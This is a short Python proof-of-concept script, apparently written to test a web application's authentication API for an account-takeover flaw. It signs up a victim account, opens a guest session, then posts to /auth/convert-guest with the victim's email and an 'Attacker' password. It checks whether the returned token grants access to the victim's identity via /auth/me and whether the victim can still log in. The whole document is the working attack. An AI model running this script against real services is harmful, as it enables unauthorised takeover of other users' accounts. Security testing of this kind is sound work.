import sys, seclib
from lib import Client, phone
name, api = sys.argv[1], sys.argv[2]
seclib.use(api)
V = seclib.signup('victim2')
anon = Client()
g = anon.post('/auth/guest', {})
gt = g.get('token'); gt = gt if isinstance(gt, str) else (gt or {}).get('accessToken')
print(f'[{name}] victim id={V["user"]["id"]} email={V["email"]}')
print(f'[{name}] guest created -> {g.status} id={(g.get("user") or {}).get("id")}')
r = Client(gt).post('/auth/convert-guest', {'full_name': 'Attacker', 'phone': phone(), 'password': 'Attacker1!', 'email': V['email']})
tok = r.get('token'); tok = tok if isinstance(tok, str) else (tok or {}).get('accessToken')
print(f'[{name}] POST /auth/convert-guest {{email: victim}} -> {r.status} user.id={(r.get("user") or {}).get("id")}')
me = Client(tok).get('/auth/me')
print(f'[{name}] GET /auth/me with returned token -> {me.status} id={me.get("id")} email={me.get("email")}')
lg = anon.post('/auth/login', {'identifier': V['email'], 'password': V['password']})
print(f'[{name}] victim can still log in with own password -> {lg.status}')
